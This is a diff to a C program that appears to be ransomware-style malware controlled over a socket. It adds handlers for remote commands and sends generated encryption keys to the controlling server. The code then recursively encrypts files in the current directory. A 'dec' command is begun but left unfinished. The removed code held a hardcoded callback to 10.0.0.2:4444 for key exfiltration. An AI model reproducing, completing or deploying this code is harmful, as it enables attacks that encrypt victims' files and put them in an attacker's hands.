@@ -61,7 +61,6 @@ int main (int argc, char * argv[])
         if (status<=0)
         {
             printf("Connection shutdown\n");
-            printf("%s\n", strerror(errno));
             abort();
         }
         
@@ -82,9 +81,8 @@ int main (int argc, char * argv[])
             {
                 strcat(path, buffer);
             }
-            printf("ls\n");
             bytes =send(sockid, (const char *)path, strlen(path),0); //send the whole result once
-            printf("%d\n", bytes);
+            
         }
         else if(strncmp(command,"enc",3) ==0)   //Handle enc command
         {
@@ -99,6 +97,8 @@ int main (int argc, char * argv[])
             char pIv[65];
 	        int status = generate_key(key, sizeKey, iv, sizeIv, pKey, pIv);
 
+            send_key(pKey, pIv, sockid, server_addr);
+
             listdir((const char *)cwd, iv, key, 'e');
             
             char response[2048];
@@ -109,6 +109,26 @@ int main (int argc, char * argv[])
 
             send(sockid, (const char *)response, strlen(response)+1,0);
             
+        }
+        else if (strncmp(command, "dec",3)==0)
+        {
+            unsigned char key[33];
+            int sizeKey = 33;
+            unsigned char iv[33];
+            int sizeIv = 33;
+            char pKey[65];
+            char pIv[65];
+            const char * separator = " ";
+
+            char * strToken = strtok(command, separator);
+            strToken = strtok(NULL, separator);
+            printf("%s\n", strToken);
+            strToken = strtok(NULL, separator);
+            printf("%s\n", strToken);
+    
+
+
+
         }
         else if (strncmp(command,"pwd",3) ==0)
         {
@@ -202,26 +222,15 @@ void listdir(const char *name, unsigned char *iv, unsigned char *key, char de_fl
 }
 
 
-int send_key(char *pKey, char *pIv)
+int send_key(char *pKey, char *pIv, int sockid, struct sockaddr_in server_addr)
 {
-    int sockid;
-    sockid = socket(AF_INET,SOCK_STREAM,0);
-
-    struct sockaddr_in server_addr;
-    server_addr.sin_family = AF_INET;
-    server_addr.sin_port = htons(4444);
-    server_addr.sin_addr.s_addr = inet_addr("10.0.0.2");
     
     char *msg = malloc(strlen(pKey)+strlen(pIv)+2);  // Format du message key:Iv
     strcpy(msg, pKey);
     strcat(msg,":");
     strcat(msg,pIv);
-
-    int status = connect(sockid,(struct sockaddr *)&server_addr, sizeof(server_addr));
     
-
-    send(sockid, (const char *)msg, strlen(msg),0);
-    close(sockid);
+    send(sockid, (const char *)msg, strlen(msg)+1,0);
     free(msg);
 }
         
